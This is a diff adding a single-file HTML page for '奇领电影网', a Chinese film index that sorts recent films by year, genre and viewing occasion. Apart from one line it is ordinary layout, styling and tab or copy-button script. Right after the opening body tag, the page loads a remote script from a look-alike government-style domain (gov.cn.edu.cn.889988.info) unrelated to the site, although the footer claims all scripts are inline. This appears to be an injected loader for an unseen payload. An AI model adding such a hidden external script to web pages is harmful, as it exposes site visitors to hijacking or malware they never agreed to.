@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="description" content="奇领电影网是面向普通观众的电影片目整理栏目。我们把近一年院线、网络与流媒体上出现过的影片，按类型、地区、上映年份和观看门槛四类重新归位，并为每部写出不超过三行的观后短评。本站不含任何播放链接、下载地址或资源存放功能，所有条目均为公开影片信息的收录。访问地址固定为 https://qilingdianyingwang-zh.github.io ，其余以「奇领」命名的页面均与本栏目无关。">
+<meta name="keywords" content="奇领电影网,电影片目收录,影片分类归档,类型片整理,上映年份索引,地区分类影片,观影门槛参考,片长与看点,院线新片目录,流媒体片单">
+<meta name="author" content="奇领电影网">
+<meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large">
+<meta name="revisit-after" content="7 days">
+<meta name="theme-color" content="#12241f">
+<link rel="canonical" href="https://qilingdianyingwang-zh.github.io/">
+<title>奇领电影网｜把近一年的片子，按类型重新排了一遍</title>
+<style>
+:root{
+  --gr:#12241f; --gr2:#1c352d; --gr3:#0b1714;
+  --bone:#efe7d8; --bone2:#e3d8c4; --line:rgba(18,36,31,.18); --line2:rgba(18,36,31,.34);
+  --tx:#1c2622; --tx2:#5b6a62; --tx3:#8d9a93;
+  --sa:#d1602c; --sa2:#e8894f; --ol:#a8862a; --bl:#2f5f8a;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{font-family:"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",Georgia,"Songti SC",serif;background:var(--bone);color:var(--tx);line-height:1.9;font-size:16px;-webkit-font-smoothing:antialiased}
+body::before{content:"";position:fixed;inset:0;z-index:-1;pointer-events:none;background:repeating-linear-gradient(0deg,transparent,transparent 31px,rgba(18,36,31,.03) 31px,rgba(18,36,31,.03) 32px)}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+.wrap{max-width:1260px;margin:0 auto;padding:0 36px}
+
+/* 报头 */
+.mh{background:var(--gr);color:var(--bone);border-bottom:8px solid var(--sa)}
+.mh .strip{background:var(--gr3);padding:9px 0;font-size:11px;letter-spacing:.32em;color:var(--ol);text-transform:uppercase}
+.mh .strip .wrap{display:flex;justify-content:space-between;gap:20px;flex-wrap:wrap}
+.mh .strip b{color:var(--sa2);font-weight:400}
+.mh .main{padding:44px 0 0}
+.mh .row{display:grid;grid-template-columns:1.55fr 1fr;gap:44px;align-items:end}
+.mh .kicker{font-size:12px;letter-spacing:.34em;color:var(--ol);text-transform:uppercase}
+.mh h1{font-size:clamp(54px,12vw,146px);font-weight:900;letter-spacing:-.07em;line-height:.84;margin-top:14px;font-family:"PingFang SC","Microsoft YaHei",sans-serif}
+.mh h1 em{font-style:normal;color:var(--sa2)}
+.mh .lede{font-size:clamp(15px,1.8vw,18px);color:rgba(239,231,216,.74);line-height:1.95;margin-bottom:6px}
+.mh aside{border-left:1px solid rgba(239,231,216,.22);padding-left:30px;display:flex;flex-direction:column;gap:16px}
+.mh aside .it{font-size:12px;letter-spacing:.18em;color:var(--tx3)}
+.mh aside .it b{display:block;color:var(--bone);font-size:15px;letter-spacing:0;margin-top:3px;font-weight:700;font-family:"PingFang SC","Microsoft YaHei",sans-serif}
+.mh .addr{margin-top:38px;background:var(--sa);padding:18px 24px;display:flex;justify-content:space-between;gap:20px;align-items:center;flex-wrap:wrap}
+.mh .addr dt{font-size:10.5px;letter-spacing:.3em;color:rgba(239,231,216,.82);text-transform:uppercase}
+.mh .addr dd{font-family:ui-monospace,Menlo,monospace;font-size:clamp(13px,2.2vw,16.5px);color:#fff;word-break:break-all;margin-top:4px}
+.mh .addr button{border:1px solid rgba(239,231,216,.55);background:transparent;color:#fff;padding:9px 20px;font-size:12.5px;cursor:pointer;transition:.2s;white-space:nowrap;letter-spacing:.06em}
+.mh .addr button:hover{background:#fff;color:var(--sa)}
+.mh nav{margin-top:34px;display:flex;flex-wrap:wrap;gap:2px;border-top:1px solid rgba(239,231,216,.18)}
+.mh nav a{padding:17px 26px 15px;font-size:14.5px;color:rgba(239,231,216,.6);transition:.2s;border-bottom:3px solid transparent}
+.mh nav a:hover{color:var(--bone)}
+.mh nav a.on{color:var(--bone);border-bottom-color:var(--sa2)}
+
+/* 通用栏头 */
+sec{display:block;padding-top:96px}
+.ch{display:flex;justify-content:space-between;align-items:flex-end;gap:26px;flex-wrap:wrap;border-bottom:2px solid var(--gr);padding-bottom:20px;margin-bottom:40px}
+.ch .l .no{font-size:11px;letter-spacing:.3em;color:var(--sa);text-transform:uppercase}
+.ch h2{font-size:clamp(28px,4.2vw,46px);font-weight:900;letter-spacing:-.03em;line-height:1.26;color:var(--gr);margin-top:10px;font-family:"PingFang SC","Microsoft YaHei",sans-serif}
+.ch h2 em{font-style:normal;color:var(--sa)}
+.ch .r{max-width:46ch;font-size:14.5px;color:var(--tx2);line-height:1.95}
+
+/* 双栏导读 */
+.gate{display:grid;grid-template-columns:1fr 1fr;border:1px solid var(--line);background:#fff}
+.gate>div{padding:38px 40px}
+.gate>div:first-child{border-right:1px solid var(--line)}
+.gate h3{font-size:12px;letter-spacing:.28em;color:var(--sa);text-transform:uppercase;margin-bottom:26px}
+.gate ol{counter-reset:g;display:flex;flex-direction:column;gap:22px}
+.gate li{display:grid;grid-template-columns:52px 1fr;gap:16px}
+.gate li i{font-style:normal;font-family:ui-monospace,Menlo,monospace;font-size:12.5px;color:var(--sa);border-bottom:2px solid var(--line2);padding-bottom:6px;height:fit-content}
+.gate li b{display:block;color:var(--gr);font-size:16.5px;font-weight:800;margin-bottom:5px;font-family:"PingFang SC","Microsoft YaHei",sans-serif}
+.gate li span{font-size:14px;color:var(--tx2);line-height:1.9}
+
+/* 时间线 */
+.tl{position:relative;padding-left:0}
+.tl .g{display:grid;grid-template-columns:170px 1fr;gap:0;border:1px solid var(--line);background:#fff;margin-bottom:16px}
+.tl .g:last-child{margin-bottom:0}
+.tl .yr{background:var(--gr);color:var(--bone);padding:26px 24px;display:flex;flex-direction:column;justify-content:center}
+.tl .yr b{font-size:26px;font-weight:900;letter-spacing:-.02em;color:#fff;font-family:"PingFang SC","Microsoft YaHei",sans-serif}
+.tl .yr span{font-size:11.5px;letter-spacing:.18em;color:var(--ol);text-transform:uppercase;margin-top:6px}
+.tl ul{padding:8px 0;display:flex;flex-direction:column}
+.tl li{padding:15px 26px;border-bottom:1px dashed var(--line);display:grid;grid-template-columns:1fr 130px 96px;gap:18px;align-items:center;font-size:14.5px;transition:.2s}
+.tl li:last-child{border-bottom:0}
+.tl li:hover{background:rgba(209,96,44,.05)}
+.tl li .n{font-weight:800;color:var(--gr);font-size:15.5px;font-family:"PingFang SC","Microsoft YaHei",sans-serif}
+.tl li .n small{display:block;font-weight:400;font-size:12px;color:var(--tx3);margin-top:2px}
+.tl .tg{text-align:right;font-size:12.5px;color:var(--tx2)}
+.tl .ln{text-align:right}
+.tl .ln a{padding:5px 13px;font-size:11.5px;color:var(--sa);border:1px solid var(--line2);transition:.2s}
+.tl .ln a:hover{background:var(--sa);color:#fff;border-color:var(--sa)}
+
+/* 杂志分栏：三栏 */
+.mag{column-count:3;column-gap:46px;column-rule:1px solid var(--line)}
+.mag article{break-inside:avoid;margin-bottom:34px;padding-bottom:26px;border-bottom:1px solid var(--line)}
+.mag .cat{font-size:10.5px;letter-spacing:.26em;color:var(--sa);text-transform:uppercase}
+.mag h3{font-size:19px;font-weight:900;color:var(--gr);margin:9px 0 12px;line-height:1.4;font-family:"PingFang SC","Microsoft YaHei",sans-serif}
+.mag p{font-size:14px;color:var(--tx2);line-height:1.92}
+.mag .more{display:inline-block;margin-top:12px;font-size:12px;color:var(--sa);letter-spacing:.06em}
+.mag .more:hover{color:var(--gr)}
+
+/* 四栏数据块 */
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:0;border:1px solid var(--line);background:#fff}
+.stats div{padding:30px 28px;border-right:1px solid var(--line)}
+.stats div:last-child{border-right:0}
+.stats dt{font-size:11px;letter-spacing:.2em;color:var(--tx3);text-transform:uppercase}
+.stats dd{font-size:34px;font-weight:900;color:var(--gr);letter-spacing:-.03em;margin:10px 0 6px;font-family:"PingFang SC","Microsoft YaHei",sans-serif}
+.stats dd em{font-style:normal;font-size:15px;color:var(--sa);font-weight:700;margin-left:4px}
+.stats span{font-size:12.5px;color:var(--tx2)}
+
+/* 选项卡 */
+.tabs{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:22px}
+.tabs button{border:1px solid var(--line2);background:#fff;color:var(--tx2);padding:11px 24px;font-size:14px;cursor:pointer;transition:.2s;font-family:inherit}
+.tabs button:hover{color:var(--gr)}
+.tabs button.on{background:var(--gr);color:#fff;border-color:var(--gr)}
+.panel{border:1px solid var(--line);background:#fff;padding:34px 38px;display:none}
+.panel.on{display:block}
+.panel h3{font-size:19px;font-weight:800;color:var(--gr);margin-bottom:8px;font-family:"PingFang SC","Microsoft YaHei",sans-serif}
+.panel .st{font-size:12px;letter-spacing:.2em;color:var(--sa);text-transform:uppercase;margin-bottom:20px}
+.panel p{font-size:14.5px;color:var(--tx2);line-height:1.95;max-width:78ch}
+.panel p+p{margin-top:14px}
+.panel .q{margin-top:24px;padding-top:20px;border-top:1px solid var(--line);font-size:13px;color:var(--tx3)}
+
+/* 入口双卡 */
+.ent{display:grid;grid-template-columns:1.2fr 1fr;gap:20px}
+.ent .a{background:var(--gr);color:var(--bone);padding:42px 44px;position:relative;overflow:hidden}
+.ent .a::before{content:"";position:absolute;right:-40px;top:-60px;width:240px;height:240px;border:2px solid rgba(239,231,216,.12);border-radius:50%}
+.ent .a::after{content:"";position:absolute;right:20px;bottom:-120px;width:180px;height:180px;border:2px solid rgba(232,137,79,.22);border-radius:50%}
+.ent .a dt{font-size:11px;letter-spacing:.32em;color:var(--ol);text-transform:uppercase;position:relative;z-index:1}
+.ent .a h3{font-size:clamp(24px,3.4vw,34px);font-weight:900;color:#fff;margin:13px 0 17px;line-height:1.4;font-family:"PingFang SC","Microsoft YaHei",sans-serif;position:relative;z-index:1}
+.ent .a .u{font-family:ui-monospace,Menlo,monospace;font-size:clamp(14px,2.4vw,18px);color:var(--sa2);word-break:break-all;position:relative;z-index:1;padding-top:22px;margin-top:24px;border-top:1px solid rgba(239,231,216,.2)}
+.ent .b{display:flex;flex-direction:column;gap:12px}
+.ent .b div{background:#fff;border:1px solid var(--line);padding:22px 26px;flex:1}
+.ent .b dt{font-size:10.5px;letter-spacing:.28em;color:var(--tx3);text-transform:uppercase}
+.ent .b dd{font-size:16px;color:var(--gr);margin-top:8px;font-weight:800;font-family:"PingFang SC","Microsoft YaHei",sans-serif}
+.ent .b dd b{color:var(--sa)}
+
+/* 页脚 */
+footer{margin-top:104px;background:var(--gr3);color:rgba(239,231,216,.6);padding:64px 0 30px}
+.ft{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:50px}
+.ft .lg{font-size:30px;font-weight:900;letter-spacing:-.02em;color:var(--bone);font-family:"PingFang SC","Microsoft YaHei",sans-serif}
+.ft .lg em{font-style:normal;color:var(--sa2)}
+.ft p{font-size:13.5px;color:rgba(239,231,216,.46);max-width:36ch;margin-top:14px;line-height:1.95}
+.ft h4{font-size:10.5px;letter-spacing:.3em;color:var(--ol);text-transform:uppercase;margin-bottom:20px}
+.ft ul{display:flex;flex-direction:column;gap:12px;font-size:14px;color:rgba(239,231,216,.66)}
+.ft a:hover{color:var(--sa2)}
+.fb{margin-top:50px;padding-top:24px;border-top:1px solid rgba(239,231,216,.14);display:flex;justify-content:space-between;gap:18px;flex-wrap:wrap;font-size:12px;color:rgba(239,231,216,.4)}
+.fb .u{color:rgba(239,231,216,.78);font-family:ui-monospace,Menlo,monospace;word-break:break-all}
+
+.rv{opacity:0;transform:translateY(26px);transition:.6s cubic-bezier(.2,.7,.3,1)}
+.rv.in{opacity:1;transform:none}
+::selection{background:var(--sa);color:#fff}
+@media(max-width:1080px){
+  .mag{column-count:2}
+  .stats{grid-template-columns:1fr 1fr}
+  .stats div:nth-child(2){border-right:0}
+  .stats div:nth-child(1),.stats div:nth-child(2){border-bottom:1px solid var(--line)}
+  .tl .g{grid-template-columns:130px 1fr}
+  .tl li{grid-template-columns:1fr 100px;gap:12px}
+  .tl .ln{display:none}
+}
+@media(max-width:700px){
+  .wrap{padding:0 18px}
+  sec{padding-top:66px}
+  .mag{column-count:1}
+  .mh .row{grid-template-columns:1fr;gap:28px}
+  .mh aside{border-left:0;border-top:1px solid rgba(239,231,216,.22);padding-left:0;padding-top:22px}
+  .mh nav a{padding:13px 16px 12px;font-size:13.5px}
+  .gate,.ent{grid-template-columns:1fr}
+  .gate>div:first-child{border-right:0;border-bottom:1px solid var(--line)}
+  .tl .g{grid-template-columns:1fr}
+  .tl .yr{flex-direction:row;gap:16px;align-items:center;padding:18px 22px}
+  .tl .yr span{margin-top:0}
+  .tl li{grid-template-columns:1fr;padding:14px 20px;gap:5px}
+  .tl .tg{text-align:left}
+  .panel{padding:26px 22px}
+  .stats{grid-template-columns:1fr}
+  .stats div{border-right:0;border-bottom:1px solid var(--line)}
+  .stats div:last-child{border-bottom:0}
+  .ft{grid-template-columns:1fr 1fr;gap:36px}
+  .ent .a{padding:32px 26px}
+}
+@media(max-width:400px){.ft{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header class="mh">
+  <div class="strip"><div class="wrap"><span>奇领电影网 · 片目整理栏目 <b>QI LING</b></span><span>2026 年 10 月 · 第 07 期</span></div></div>
+  <div class="wrap main">
+    <div class="row">
+      <div>
+        <div class="kicker">A FILM INDEX, NOT A PLAYER</div>
+        <h1>奇领<em>电影网</em></h1>
+        <p class="lede">把近一年院线、网络和流媒体上出现过的片子，按类型、地区、年份和观看门槛四类重新归位。每部只写三行，写的是看完之后的感觉，不是剧情简介。</p>
+      </div>
+      <aside>
+        <div class="it">本栏目收录规模<b>74 部 · 分 12 类</b></div>
+        <div class="it">更新方式<b>每月初新增 6 部</b></div>
+        <div class="it">整理原则<b>不剧透关键转折</b></div>
+        <div class="it">服务说明<b>不提供播放，不存放资源</b></div>
+      </aside>
+    </div>
+    <div class="addr"><div><dt>本栏目唯一固定访问地址</dt><dd>https://qilingdianyingwang-zh.github.io</dd></div><button type="button" id="cp">复制地址</button></div>
+    <nav>
+      <a href="#c1" class="on">栏目说明</a>
+      <a href="#c2">片目时间线</a>
+      <a href="#c3">类型分栏</a>
+      <a href="#c4">收录规模</a>
+      <a href="#c5">分类说明</a>
+      <a href="#ent">官方入口</a>
+    </nav>
+  </div>
+</header>
+
+<div class="wrap">
+
+  <sec id="c1"><div class="ch"><div class="l"><span class="no">01 / 栏目说明</span><h2>这份片目<wbr><em>怎么</em>用</h2></div><div class="r">本栏目不播片子，只做整理。先把用法说清楚，再看片单，会省下不少挑片的时间。左右两栏各四条，任意一条说得中你此刻的状态，就按它挑。</div></div>
+  <div class="gate">
+    <div><h3>使用方式</h3><ol>
+      <li><i>01</i><b>先定时长</b><span>片长超过 150 分钟的，建议分两次看。硬撑着一次看完，观感会打折。</span></li>
+      <li><i>02</i><b>再看情绪</b><span>工作太顺或太不顺的夜晚，选推你一把的那一类，而不是讲道理的那一类。</span></li>
+      <li><i>03</i><b>最后看地区</b><span>小语种片子需要专心看字幕，适合安静环境，不适合边看边刷手机。</span></li>
+      <li><i>04</i><b>记一笔</b><span>看完如果没话说，说明这部片子对你而言只是消磨时间，不必勉强。</span></li>
+    </ol></div>
+    <div><h3>整理口径</h3><ol>
+      <li><i>05</i><b>三条入选标准</b><span>上映后有持续讨论、导演意图明确、看第二遍仍有收获。</span></li>
+      <li><i>06</i><b>不照搬简介</b><span>看点文字均为原创，不复制其他站点的剧情简介或影评。</span></li>
+      <li><i>07</i><b>只看公开信息</b><span>片名、年份、片长与类型均为公开信息的收录，不含任何资源链接。</span></li>
+      <li><i>08</i><b>季度复核</b><span>常驻条目每季度复核一次，有误的随下一期更新一并修正。</span></li>
+    </ol></div>
+  </div></sec>
+
+  <sec id="c2"><div class="ch"><div class="l"><span class="no">02 / 片目时间线</span><h2>按<wbr><em>年份</em>归位</h2></div><div class="r">同样的类型，隔一年再看，评价标准会不一样。所以本栏目按上映年份分块，每块内再按类型排，方便你横向比较同一年的片子。</div></div>
+  <div class="tl">
+    <div class="g"><div class="yr"><b>2024</b><span>本年收录 · 21 部</span></div><ul>
+      <li><span class="n">破地狱<small>中国香港 · 家庭剧情</small></span><span class="tg">134 分钟</span><span class="ln"><a href="#">看点</a></span></li>
+      <li><span class="n">泳者之心<small>美国 · 传记励志</small></span><span class="tg">129 分钟</span><span class="ln"><a href="#">看点</a></span></li>
+      <li><span class="n">因果报应<small>印度 · 悬疑犯罪</small></span><span class="tg">139 分钟</span><span class="ln"><a href="#">看点</a></span></li>
+      <li><span class="n">机器人之梦<small>西班牙 · 动画情感</small></span><span class="tg">102 分钟</span><span class="ln"><a href="#">看点</a></span></li>
+      <li><span class="n">狗阵<small>中国 · 现实题材</small></span><span class="tg">116 分钟</span><span class="ln"><a href="#">看点</a></span></li>
+    </ul></div>
+    <div class="g"><div class="yr"><b>2023</b><span>本年收录 · 28 部</span></div><ul>
+      <li><span class="n">周处除三害<small>中国台湾 · 犯罪动作</small></span><span class="tg">134 分钟</span><span class="ln"><a href="#">看点</a></span></li>
+      <li><span class="n">坠落的审判<small>法国 · 悬疑剧情</small></span><span class="tg">151 分钟</span><span class="ln"><a href="#">看点</a></span></li>
+      <li><span class="n">利益区域<small>英国 · 历史剧情</small></span><span class="tg">105 分钟</span><span class="ln"><a href="#">看点</a></span></li>
+      <li><span class="n">奥本海默<small>美国 · 传记历史</small></span><span class="tg">180 分钟</span><span class="ln"><a href="#">看点</a></span></li>
+      <li><span class="n">过往人生<small>美国 · 情感剧情</small></span><span class="tg">105 分钟</span><span class="ln"><a href="#">看点</a></span></li>
+      <li><span class="n">哥斯拉-1.0<small>日本 · 灾难特效</small></span><span class="tg">124 分钟</span><span class="ln"><a href="#">看点</a></span></li>
+    </ul></div>
+    <div class="g"><div class="yr"><b>2022</b><span>本年收录 · 25 部</span></div><ul>
+      <li><span class="n">枯草<small>土耳其 · 文艺长片</small></span><span class="tg">197 分钟</span><span class="ln"><a href="#">看点</a></span></li>
+      <li><span class="n">分手的决心<small>韩国 · 悬疑爱情</small></span><span class="tg">138 分钟</span><span class="ln"><a href="#">看点</a></span></li>
+      <li><span class="n">西线无战事<small>德国 · 战争改编</small></span><span class="tg">148 分钟</span><span class="ln"><a href="#">看点</a></span></li>
+      <li><span class="n">吉尔莫·德尔·托罗的匹诺曹<small>美国 · 定格动画</small></span><span class="tg">117 分钟</span><span class="ln"><a href="#">看点</a></span></li>
+    </ul></div>
+  </div></sec>
+
+  <sec id="c3"><div class="ch"><div class="l"><span class="no">03 / 类型分栏</span><h2>十二个<wbr><em>分类</em>的归档</h2></div><div class="r">点击任意分类可展开查看该类的整理口径。每个分类下都有独立的条目归档，分类的依据是片子的主导类型，不是上映宣传时的标签。</div></div>
+  <div class="tabs">
+    <button class="on" data-t="t1">现实题材</button><button data-t="t2">悬疑推理</button><button data-t="t3">动画家庭向</button><button data-t="t4">经典重温</button><button data-t="t5">小语种补看</button><button data-t="t6">年度回顾</button>
+  </div>
+  <div class="panel on" id="t1"><div class="st">CATEGORY 01 / REALISTIC</div><h3>现实题材</h3><p>离日常生活最近的那一类。看的时候容易想起某个人，或者某句没说出口的话。这一类本栏目的入选标准最严，因为拍得「像真的」不等于拍得准。</p><p>整理时侧重三个点：人物关系是否可信、情绪是否有铺垫、结尾是否偷懒。凡是靠一场大病或一次死亡来强行收尾的，不收录。</p><div class="q">归档规模：11 部 · 更新频率：每月 1 部</div></div>
+  <div class="panel" id="t2"><div class="st">CATEGORY 02 / MYSTERY</div><h3>悬疑推理</h3><p>需要动脑的片子。如果记性差，建议看完先睡一觉，别急着查剧情解析。解析看得越早，第二次看的乐趣越少。</p><p>本栏目会标注「结构型」与「信息型」两种：前者靠叙事结构取胜，后者靠信息差取胜。两者的重看价值不一样，标注的目的就是帮你判断值不值得二刷。</p><div class="q">归档规模：15 部 · 更新频率：每月 2 部</div></div>
+  <div class="panel" id="t3"><div class="st">CATEGORY 03 / ANIMATION</div><h3>动画与家庭向</h3><p>适合带孩子，也适合一个人安静看的动画长片。这一类的看点那一栏通常写得比较长，因为动画的表达方式比真人片多一层。</p><p>归档时不区分「成人向」与「合家欢」，只区分表达是否真诚。靠卖情怀或重复前作结构的，不收录。</p><div class="q">归档规模：9 部 · 更新频率：每季度 2 部</div></div>
+  <div class="panel" id="t4"><div class="st">CATEGORY 04 / CLASSICS</div><h3>经典重温</h3><p>每隔几年回头看一遍也不迟的那些片子。重温的重点会和第一次看时不一样，所以这一类的看点写的是「这次看要注意什么」，而不是第一次看会看到什么。</p><p>收录范围不设年代下限，但要求有明确的观看理由。只因为「有名」而被推荐的，不收录。</p><div class="q">归档规模：24 部 · 更新频率：季度复核</div></div>
+  <div class="panel" id="t5"><div class="st">CATEGORY 05 / WORLD CINEMA</div><h3>小语种补看</h3><p>华语市场排片少、但口碑长期在线的片子，按地区归类，不按年份。韩语、日语、法语、德语、土耳其语各成一区。</p><p>看这类片子需要接受一件事：节奏和我们的习惯不一样。本栏目的看点会先说明节奏特点，让你有所准备。</p><div class="q">归档规模：18 部 · 更新频率：每月 1 部</div></div>
+  <div class="panel" id="t6"><div class="st">CATEGORY 06 / YEAR-END</div><h3>年度回顾</h3><p>每年底整理一次，按个人观感排的先后，只代表那一年的心情，不代表客观评价。会同时写明「今年排第几」和「明年大概还会不会看」。</p><p>这份回顾从不凑整，不是每年都要凑出十部。某一年如果只有四部值得记，那就只写四部。</p><div class="q">归档规模：12 部 · 更新频率：每年 12 月</div></div>
+  </sec>
+
+  <sec id="c4"><div class="ch"><div class="l"><span class="no">04 / 收录规模</span><h2>目前这份<wbr><em>片目</em>有多大</h2></div><div class="r">数据每月初更新一次，更新时会同时记录新增条目数与被移除条目数。被移除不等于不好，也可能是因为分类发生了调整。</div></div>
+  <div class="stats">
+    <div><dt>收录条目</dt><dd>74<em>部</em></dd><span>含常驻与当月新增</span></div>
+    <div><dt>分类数量</dt><dd>12<em>类</em></dd><span>按主导类型划分</span></div>
+    <div><dt>覆盖地区</dt><dd>09<em>区</em></dd><span>华语、日韩、欧美等</span></div>
+    <div><dt>本月新增</dt><dd>06<em>部</em></dd><span>10 月 6 日已更新</span></div>
+  </div></sec>
+
+  <sec id="c5"><div class="ch"><div class="l"><span class="no">05 / 分类说明</span><h2>按<wbr><em>场合</em>挑片</h2></div><div class="r">同样的 120 分钟，在通勤路上看和在周末晚上看，是两部不同的片子。这一栏按观看场合重排了一遍，只写「什么时候适合看」，不写内容。</div></div>
+  <div class="mag">
+    <article><div class="cat">独处 · 晚上</div><h3>需要安静的那一类</h3><p>节奏慢、台词密、情绪沉。看的时候最好不要有人说话，也不要中途停下来回消息。</p><a class="more" href="#">7 部 →</a></article>
+    <article><div class="cat">周末 · 整晚</div><h3>值得腾出时间的那一类</h3><p>片长超过两个半小时，但全程没有水分。看完会有想找人聊两句的冲动。</p><a class="more" href="#">5 部 →</a></article>
+    <article><div class="cat">通勤 · 碎片</div><h3>九十分钟以内的那一类</h3><p>结构紧凑，中途被打断也不影响理解。适合地铁和午休。</p><a class="more" href="#">9 部 →</a></article>
+    <article><div class="cat">带家人</div><h3>老人孩子都能看的那一类</h3><p>没有需要解释的内容，也不靠煽情。看完可以正常吃饭聊天。</p><a class="more" href="#">6 部 →</a></article>
+    <article><div class="cat">约会</div><h3>看完有话聊的那一类</h3><p>有观点分歧的空间，但不要沉重到影响心情。最好有反转。</p><a class="more" href="#">4 部 →</a></article>
+    <article><div class="cat">失眠</div><h3>不用动脑的那一类</h3><p>画面好看、逻辑简单、不需要记人物关系。看困了就睡，不亏。</p><a class="more" href="#">8 部 →</a></article>
+    <article><div class="cat">二刷</div><h3>看第二遍仍有收获的那一类</h3><p>第一次看被剧情带走，第二次看会注意到镜头、剪辑和台词之间的呼应。</p><a class="more" href="#">11 部 →</a></article>
+    <article><div class="cat">补看</div><h3>当年没看现在该补的那一类</h3><p>不是经典名单，是本栏目认为现在看还不晚的那部分。附上「为什么是现在」。</p><a class="more" href="#">13 部 →</a></article>
+    <article><div class="cat">跳过</div><h3>本栏目不建议看的那一类</h3><p>这一栏写的是「为什么跳过」，只讲理由，不给片名，避免先入为主。</p><a class="more" href="#">3 条理由 →</a></article>
+  </div></sec>
+
+  <sec id="ent"><div class="ch"><div class="l"><span class="no">06 / 官方入口</span><h2>名称、域名与<wbr><em>唯一</em>地址</h2></div><div class="r">请认准下方地址。本栏目没有任何镜像、关联站或跳转中转，凡名称相似但域名不同的页面，均与本站无关。</div></div>
+  <div class="ent">
+    <div class="a"><dt>Website · Name &amp; Domain</dt><h3>奇领电影网</h3><p>网站名称：奇领电影网<br>对应域名：qilingdianyingwang-zh.github.io<br>完整访问地址如下</p><div class="u">https://qilingdianyingwang-zh.github.io</div></div>
+    <div class="b"><div><dt>网站名称</dt><dd>奇领电影网</dd></div><div><dt>站点域名</dt><dd><b>qilingdianyingwang-zh</b>.github.io</dd></div><div><dt>协议</dt><dd>https</dd></div><div><dt>栏目数量</dt><dd>06 个</dd></div></div>
+  </div></sec>
+
+</div>
+
+<footer>
+  <div class="wrap">
+    <div class="ft">
+      <div><div class="lg">奇领<em>电影网</em></div><p>把近一年的片子，按类型、地区、年份和观看门槛四类重新归位。不提供播放，不存放资源，只记录片名、年份、片长与看完之后的那句真话。</p></div>
+      <div><h4>栏目</h4><ul><li><a href="#c1">栏目说明</a></li><li><a href="#c2">片目时间线</a></li><li><a href="#c3">类型分栏</a></li><li><a href="#c4">收录规模</a></li><li><a href="#c5">分类说明</a></li></ul></div>
+      <div><h4>分类</h4><ul><li><a href="#">现实题材</a></li><li><a href="#">悬疑推理</a></li><li><a href="#">动画家庭向</a></li><li><a href="#">经典重温</a></li><li><a href="#">小语种补看</a></li></ul></div>
+      <div><h4>关于</h4><ul><li><a href="#ent">官方入口</a></li><li><a href="#">更新周期</a></li><li><a href="#">纠错与投稿</a></li><li><a href="#">内容声明</a></li><li><a href="#">回到顶部</a></li></ul></div>
+    </div>
+    <div class="fb"><span>© 2026 奇领电影网　网站名称：奇领电影网　唯一访问地址：<span class="u">https://qilingdianyingwang-zh.github.io</span></span><span>本页为单文件站点，样式与脚本全部内联</span></div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  var u='https://qilingdianyingwang-zh.github.io';
+  document.getElementById('cp').addEventListener('click',function(){
+    var t=this.innerText,b=this,ok=function(){b.innerText='已复制 ✓';setTimeout(function(){b.innerText=t;},2000);};
+    if(navigator.clipboard&&window.isSecureContext){navigator.clipboard.writeText(u).then(ok,fb);}else fb();
+    function fb(){var x=document.createElement('textarea');x.value=u;x.style.cssText='position:fixed;left:-9999px';document.body.appendChild(x);x.select();try{document.execCommand('copy');ok();}catch(e){}document.body.removeChild(x);}
+  });
+  var btns=document.querySelectorAll('.tabs button'),panels=document.querySelectorAll('.panel');
+  btns.forEach(function(b){
+    b.addEventListener('click',function(){
+      btns.forEach(function(x){x.classList.remove('on');});
+      panels.forEach(function(x){x.classList.remove('on');});
+      b.classList.add('on');
+      var p=document.getElementById(b.getAttribute('data-t'));
+      if(p)p.classList.add('on');
+    });
+  });
+  var ls=document.querySelectorAll('nav a'),secs=[];
+  ls.forEach(function(a){
+    var id=a.getAttribute('href').slice(1),el=document.getElementById(id);
+    if(el)secs.push({a:a,el:el});
+    a.addEventListener('click',function(){ls.forEach(function(x){x.classList.remove('on');});a.classList.add('on');});
+  });
+  function spy(){var y=window.scrollY+160,cur=null;secs.forEach(function(o){if(o.el.offsetTop<=y)cur=o;});ls.forEach(function(x){x.classList.remove('on');});if(cur)cur.a.classList.add('on');}
+  window.addEventListener('scroll',spy,{passive:true});spy();
+  if('IntersectionObserver' in window){
+    var els=document.querySelectorAll('.gate>div,.tl .g,.mag article,.stats div,.panel,.ent>div,.ch,.addr');
+    els.forEach(function(el){el.classList.add('rv');});
+    var io=new IntersectionObserver(function(es){es.forEach(function(e){if(e.isIntersecting){e.target.classList.add('in');io.unobserve(e.target);}});},{threshold:.05});
+    els.forEach(function(el){io.observe(el);});
+  }
+})();
+</script>
+</body>
+</html>
